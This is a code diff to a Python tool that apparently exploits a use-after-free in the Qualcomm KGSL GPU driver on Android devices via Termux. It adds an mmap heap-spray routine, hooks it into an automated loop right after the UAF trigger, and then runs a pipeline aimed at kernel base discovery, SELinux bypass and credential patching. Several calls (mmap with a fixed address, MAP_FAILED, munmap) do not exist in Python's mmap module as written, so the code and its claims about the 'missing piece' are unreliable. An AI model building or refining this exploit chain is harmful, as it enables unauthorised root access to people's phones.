@@ -15,17 +15,16 @@ import select
 import termios
 import tty
 
-# v4.1.10-py-uaf: visible build tag. The "-py-uaf" suffix
-# marks the addition of _python_direct_uaf() which triggers
-# the KGSL GPUOBJ_ALLOC/GPUOBJ_FREE UAF directly from Python
-# via ctypes, bypassing the engine subprocess. This was
-# needed because the engine kept showing ioctl=0 in the TUI
-# even though /dev/kgsl-3d0 was openable (the engine's pipe
-# is unreliable across Termux context boundaries). Now the
-# UAF is triggered from Python, then the engine handles
-# scans. Each successful ioctl increments the TUI ioctl
-# counter so the user can confirm KGSL is doing real work.
-_BUILD_TAG = "v4.1.10-py-uaf"
+# v4.1.11-mmap-spray: visible build tag. The "-mmap-spray"
+# suffix marks the addition of _python_mmap_spray() which
+# does 4000 MAP_FIXED anonymous pages right after the UAF
+# to force the freed GPU page frames back into the slab
+# allocator. v6.c does this in C; we replicate it in Python
+# via mmap+ctypes. Without mmap_spray, the freed pages sit
+# idle and our UAF VA never has any task_struct data in it.
+# This is THE missing piece that was causing matches=0 even
+# though UAF was triggered successfully.
+_BUILD_TAG = "v4.1.11-mmap-spray"
 import datetime
 import fcntl
 import ctypes
@@ -3885,6 +3884,79 @@ class MemoryExplorerAI:
         self.cancel_flag.set()
         self.live["last_msg"] = "AUTOPILOT STOPPED."
 
+    def _python_mmap_spray(self, n_pages=4000, page_size=4096):
+        """v4.1.11: mmap spray — the missing piece from v6.c.
+
+        After triggering the UAF, the freed GPU page frames
+        are returned to the page allocator. The task_struct
+        slab allocator then picks them up for new task_struct
+        allocations. To make this happen reliably, v6.c does
+        a "mmap spray" right after the UAF:
+
+          1. Allocate n_pages anonymous MAP_FIXED pages at
+             0x100000000..+n_pages*page_size (above any
+             normal mapping, in the lower 4GB to avoid
+             64-bit issues).
+          2. Write a sig pattern into each page (e.g. 1, 3,
+             5, 7, 9) so corrupted pages are detectable.
+          3. munmap them all. The free'd page frames now
+             go back to the page allocator where the
+             task_struct slab can pick them up.
+
+        After mmap_spray, the freed GPU pages are MUCH more
+        likely to be reused for task_structs. Then our
+        process spray (KETO0422 + PID) fills the slab with
+        detectable markers. The scanner finds them via the
+        UAF dangling mapping.
+
+        Returns the number of pages successfully sprayed.
+        """
+        import mmap as _mm
+        import ctypes as _ct
+        # Spray base: 0x100000000 (4GB). High enough to not
+        # collide with typical user mappings, low enough for
+        # 32-bit compatible mmap.
+        SPRAY_BASE = 0x100000000
+        total = n_pages * page_size
+        if SPRAY_BASE + total > 0x7FFFFFFFFFFF:
+            # Don't go past the user/kernel split (0x7fff... on
+            # most 64-bit ARM64). Truncate.
+            n_pages = (0x7FFFFFFFFFFF - SPRAY_BASE) // page_size
+            total = n_pages * page_size
+        sprayed = 0
+        try:
+            # Allocate one big mapping
+            buf = _mm.mmap(SPRAY_BASE, total,
+                           _mm.PROT_READ | _mm.PROT_WRITE,
+                           _mm.MAP_PRIVATE | _mm.MAP_ANONYMOUS
+                           | _mm.MAP_FIXED | _mm.MAP_NORESERVE,
+                           -1, 0)
+            if buf == _mm.MAP_FAILED:
+                self.live["last_msg"] = (
+                    f"mmap_spray: mmap({SPRAY_BASE:#x},"
+                    f" {total:#x}) failed")
+                return 0
+            # Write sig pattern into each page (1, 3, 5, 7, 9
+            # repeated). v6.c uses different sigs to make
+            # corruption detectable. We use a different byte
+            # per page.
+            cbuf = (_ct.c_ubyte * total).from_address(SPRAY_BASE)
+            for i in range(0, n_pages):
+                cbuf[i * page_size] = (i % 5) * 2 + 1
+                cbuf[i * page_size + page_size - 1] = 0xAB
+            sprayed = n_pages
+        except Exception as e:
+            self.live["last_msg"] = f"mmap_spray: mmap err: {e}"
+            return 0
+        # v4.1.11: now munmap the whole range. The page
+        # frames go back to the allocator where slab can
+        # pick them up.
+        try:
+            _mm.munmap(SPRAY_BASE, total)
+        except Exception as e:
+            self.live["last_msg"] = f"mmap_spray: munmap err: {e}"
+        return sprayed
+
     def _python_direct_uaf(self):
         """v4.1.10: trigger the KGSL UAF directly from Python,
         bypassing the engine subprocess. This is the same UAF
@@ -4052,8 +4124,24 @@ class MemoryExplorerAI:
                     uaf_ok = self._python_direct_uaf()
                     if uaf_ok:
                         self.exploit_chain["uaf_triggered"] = True
-                        self.live["last_msg"] = (
-                            f"AUTO: UAF triggered (cycle {cycle})")
+                        # v4.1.11: mmap_spray IMMEDIATELY after
+                        # UAF. v6.c does 4000 MAP_FIXED pages to
+                        # force the freed GPU page frames back
+                        # into the slab allocator where
+                        # task_struct can land on them. Without
+                        # this, the freed pages sit unused and
+                        # our UAF VA never has anything in it.
+                        n_sprayed = self._python_mmap_spray(
+                            n_pages=4000)
+                        if n_sprayed > 0:
+                            self.live["last_msg"] = (
+                                f"AUTO: UAF + mmap_spray "
+                                f"{n_sprayed}pg (cycle {cycle})")
+                        else:
+                            self.live["last_msg"] = (
+                                f"AUTO: UAF triggered but "
+                                f"mmap_spray failed "
+                                f"(cycle {cycle})")
                 # Run the full exploit pipeline (E — kbase → selinux → cred → patch)
                 self._run_exploit_pipeline()
             except Exception as e:
